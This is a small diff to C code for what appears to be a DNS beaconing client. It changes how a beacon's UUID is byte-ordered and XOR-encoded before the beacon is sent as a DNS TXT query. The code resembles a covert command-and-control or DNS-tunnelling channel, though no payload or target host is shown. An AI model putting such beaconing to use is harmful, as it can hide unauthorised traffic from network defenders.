@@ -10,7 +10,7 @@
 
 #include "messagetypes.h"
 #include "base64.c"
-#define UUID 0xffff
+#define UUID 0x1234
 #define XOR_CHAR 0x33
  
 char dns_servers[10][100];
@@ -143,8 +143,9 @@ int main( int argc , char *argv[])
     beacon = (struct Beacon*)malloc(sizeof(struct Beacon));
     //beacon->type = (FORMAT_PLAIN << 4) | BEACON_PING;
     beacon->type = (FORMAT_XOR << 4) | BEACON_PING;
-    beacon->uuid = UUID;
-    xor((unsigned char*)&beacon->uuid, 2);
+    beacon->uuid = htons(UUID);
+    //xor((unsigned char*)&beacon->uuid, 2);
+    encode((unsigned char*)&beacon->uuid, 2, FORMAT_XOR);;
     ngethostbyname(hostname, T_TXT, beacon, 3);
  
     return 0;
@@ -535,7 +536,7 @@ struct Beacon* create_beacon(int format, int type, char * data, unsigned short d
     beacon = (struct Beacon*)malloc(sizeof(struct Beacon) + data_length);
     beacon->type = ((format << 4) & 0xf0) | (type & 0x0f);
     printf("XXXXXXXXXXXXXX beacon->type = %d\n", beacon->type);
-    beacon->uuid = UUID;
+    beacon->uuid = htons(UUID);
     encode((unsigned char*)&beacon->uuid, 2, format);;
     beacon->data_length = data_length;
     encode((unsigned char*)&beacon->data_length, 2, format);
